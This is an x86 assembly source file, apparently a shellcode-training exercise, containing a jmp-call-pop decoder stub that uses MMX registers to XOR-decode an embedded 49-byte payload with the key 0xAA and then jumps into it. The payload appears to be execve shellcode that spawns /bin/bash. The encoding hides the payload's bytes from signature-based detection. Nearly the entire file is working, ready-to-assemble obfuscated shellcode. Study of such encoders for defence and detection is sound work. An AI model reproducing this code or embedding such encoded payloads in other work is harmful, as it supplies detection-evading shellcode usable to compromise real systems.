;Xor encoder using MMX register
; MMX includes 8 8-byte registers from MM0 and MM7

global _start

section .text

_start:
	
	jmp short decodeStr

F1:	
	
	pop esi
	lea edi,[esi+8]
	xor ecx,ecx
	; shellcode length is 49. 8*7>49
	mov cl,7

decodeLoop:
	;use mm1 and mm0 for xoring contents of esi and edi
	;esi points to sequence of 8 0xAA
	;edi points to shellcode
	
	movq mm0, qword [esi]
	movq mm1, qword [edi]
	;Result of xor is stored in mm0. mm0 is restored at top of loop
	pxor mm0,mm1
	; store the xored decoded shellcode back to address pointed by edi
	movq qword [edi], mm0
	; increment address pointed by edi by 8 bytes
	add edi,8
	
	loop decodeLoop

	jmp encshell 






decodeStr:
	;Store the bytes that are used for decoding. We will decode 8 bytes at a time here
	call F1 ;Push the address of the next instr, which is address of 8 bytes onto the stack
	decoderB: db 0xAA,0xAA,0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
	;address of encshell is 8bytes after decoderB, Length of this encoded shellcode is 49 bytes
	encshell: db 0x41,0xb2,0xf4,0x9b,0x6a,0x22,0xec,0xa3,0x23,0xdc,0xa0,0x23,0xec,0xa4,0x23,0x59,0x27,0xe4,0xa0,0x27,0xfc,0xa4,0x1a,0xa1,0x67,0x2a,0x42,0x49,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xc8,0xcb,0xd9,0xc2,0xf2,0xf3,0xf3,0xf3,0xf3,0xe9,0xe9,0xe9,0xe9
